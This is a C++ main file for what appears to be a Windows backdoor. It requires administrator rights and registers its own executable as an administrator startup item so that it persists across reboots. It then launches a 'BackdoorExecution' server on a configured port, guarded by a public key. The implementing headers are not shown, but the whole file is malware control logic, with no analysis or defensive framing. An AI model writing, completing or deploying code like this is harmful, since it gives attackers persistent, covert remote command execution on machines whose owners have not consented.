#include <error_message_macro.hpp>
#include <AdminCheck.hpp>
#include <PathToCurrentExecutable.hpp>
#include <AdminStartupItem.hpp>
#include <CombaseLibrary.hpp>
#include <BackdoorExecution.hpp>
#include <SharedConstants.hpp>

#include <iostream>
#include <ios>
#include <iomanip>

#include <stdexcept>
#include <exception>
#include <sstream>
#include <type_traits>

#include <csignal>

static volatile std::sig_atomic_t g_program_is_stopping = false;

static void SignalHandler(int signal)
{
    g_program_is_stopping = true;
}

int main()
{
    // HANDLE CTRL+C and CTRL+Break (and kill in Linux)
    std::signal(SIGINT, SignalHandler);
    std::signal(SIGTERM, SignalHandler);

    try
    {
        if (!AdminCheck{}.IsAdmin())
        {
            throw std::runtime_error{ ERROR_MESSAGE("Program must be run as administrator") };   
        }
        std::cout << "Program is running as administrator" << std::endl;

        CombaseLibrary combase_library{};

        // Get the path to the current executable.
        const std::wstring path_to_current_executable = PathToCurrentExecutable{}.GetPath();
        std::wcout << "Path to current executable: " << path_to_current_executable << std::endl;

        AdminStartupItem{}.Create(path_to_current_executable);
        std::cout << "Created startup item successfully" << std::endl;

        // Start the backdoor execution server
        BackdoorExecution{}.Serve(
            g_program_is_stopping,
            g_port_number,
            g_public_key);
    }
    catch (std::exception& e)
    {
        std::cerr << "Exception in main: " << e.what() << std::endl;
    }
    return 0;
}
